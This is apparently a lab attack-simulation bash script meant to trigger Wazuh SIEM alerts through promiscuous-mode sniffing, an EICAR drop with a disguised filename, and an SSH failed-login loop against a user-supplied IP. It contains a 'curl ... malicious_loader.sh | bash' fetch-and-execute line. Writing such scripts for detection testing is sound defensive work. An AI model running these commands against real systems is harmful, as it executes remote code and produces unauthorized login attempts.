#!/usr/bin/env bash
# ==============================================================================
# Enterprise CyberLab - Attack Simulation & Telemetry Trigger Script
# Author: CyberLab Security Operations
# Purpose: Generate controlled security telemetry for Wazuh SIEM detection
# Target: Linux Endpoints (e.g., mint01 / Ubuntu)
# ==============================================================================

set -euo pipefail

# Color Output Formatting
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Check for root privilege requirement
check_sudo() {
    if [[ $EUID -ne 0 ]]; then
       echo -e "${RED}[!] This scenario requires superuser privileges. Re-running with sudo...${NC}"
       exec sudo "$0" "$@"
    fi
}

banner() {
    echo -e "${BLUE}"
    echo "=========================================================="
    echo "       CYBERLAB ENTERPRISE ATTACK SIMULATION SUITE       "
    echo "=========================================================="
    echo -e "${NC}"
}

# ------------------------------------------------------------------------------
# Scenario 1: Network Reconnaissance (Promiscuous Mode Detection)
# ------------------------------------------------------------------------------
run_scenario_1() {
    check_sudo
    echo -e "\n${YELLOW}[+] Scenario 1: Network Reconnaissance & Promiscuous Mode${NC}"
    echo -e "    Targeting primary network interface..."

    # Identify primary network interface
    IFACE=$(ip route | grep default | awk '{print $5}' | head -n 1)
    
    if [ -z "$IFACE" ]; then
        IFACE="eth0"
    fi

    echo -e "    [*] Enabling promiscuous mode on interface: ${GREEN}${IFACE}${NC}"
    ip link set dev "$IFACE" promisc on
    echo -e "    [✓] Promiscuous mode ENABLED (Triggering Wazuh Rule 510)"

    echo -e "    [*] Capturing 20 background packets with tcpdump..."
    tcpdump -i "$IFACE" -c 20 > /dev/null 2>&1 || true

    sleep 3

    echo -e "    [*] Restoring interface to normal state..."
    ip link set dev "$IFACE" promisc off
    echo -e "    [✓] Promiscuous mode DISABLED"
    echo -e "${GREEN}[+] Scenario 1 Complete. Check Wazuh Threat Hunting for Rule 510.${NC}\n"
}

# ------------------------------------------------------------------------------
# Scenario 2: Phishing & Malicious Execution Simulation
# ------------------------------------------------------------------------------
run_scenario_2() {
    echo -e "\n${YELLOW}[+] Scenario 2: Phishing Payload & File Integrity Monitoring (FIM)${NC}"
    
    # Define dropped file location
    TARGET_DIR="$HOME/Downloads"
    mkdir -p "$TARGET_DIR"
    EICAR_FILE="$TARGET_DIR/invoice_2026_spec.pdf.exe"

    echo -e "    [*] Dropping EICAR test string into: ${GREEN}${EICAR_FILE}${NC}"
    echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > "$EICAR_FILE"
    echo -e "    [✓] File created (Triggering Wazuh FIM / Syscheck)"

    sleep 2

    echo -e "    [*] Simulating suspicious piped shell execution (curl | bash)..."
    curl -s http://example.com/malicious_loader.sh | bash 2>/dev/null || true
    echo -e "    [✓] Execution attempted (Triggering Process Monitoring alert)"

    sleep 3

    echo -e "    [*] Cleaning up synthetic file..."
    rm -f "$EICAR_FILE"
    echo -e "    [✓] File removed"
    echo -e "${GREEN}[+] Scenario 2 Complete. Check Wazuh Dashboard for FIM & Command alerts.${NC}\n"
}

# ------------------------------------------------------------------------------
# Scenario 3: SSH Brute-Force & Active Response Trigger
# ------------------------------------------------------------------------------
run_scenario_3() {
    echo -e "\n${YELLOW}[+] Scenario 3: SSH Brute-Force & Automated Active Response${NC}"
    read -p "Enter Target IP address for SSH brute-force simulation [default: 127.0.0.1]: " TARGET_IP
    TARGET_IP=${TARGET_IP:-127.0.0.1}

    echo -e "    [*] Executing failed SSH login attempts against ${GREEN}${TARGET_IP}${NC}..."
    
    for i in {1..12}; do
        echo "    --> Failed authentication attempt $i/12..."
        ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 -o PreferredAuthentications=password -o PubkeyAuthentication=no "bad_user_$i@$TARGET_IP" "exit" > /dev/null 2>&1 || true
        sleep 0.5
    done

    echo -e "    [✓] Failed authentication loop finished (Triggering MITRE T1110 / SSHD Alert)"
    echo -e "${GREEN}[+] Scenario 3 Complete. Check Wazuh Active Response logs for blocked IP.${NC}\n"
}

# ------------------------------------------------------------------------------
# Execution Menu
# ------------------------------------------------------------------------------
banner

if [ "${1:-}" == "all" ]; then
    run_scenario_1
    run_scenario_2
    run_scenario_3
    exit 0
fi

echo "Select an attack simulation to run:"
echo "1) Scenario 1: Network Sniffing (Promiscuous Mode)"
echo "2) Scenario 2: Phishing Payload & Script Execution (FIM)"
echo "3) Scenario 3: SSH Brute Force (Active Response)"
echo "4) Run ALL Scenarios"
echo "5) Exit"
echo ""
read -p "Selection [1-5]: " CHOICE

case $CHOICE in
    1) run_scenario_1 ;;
    2) run_scenario_2 ;;
    3) run_scenario_3 ;;
    4) run_scenario_1; run_scenario_2; run_scenario_3 ;;
    5) echo "Exiting."; exit 0 ;;
    *) echo -e "${RED}Invalid option.${NC}"; exit 1 ;;
esac
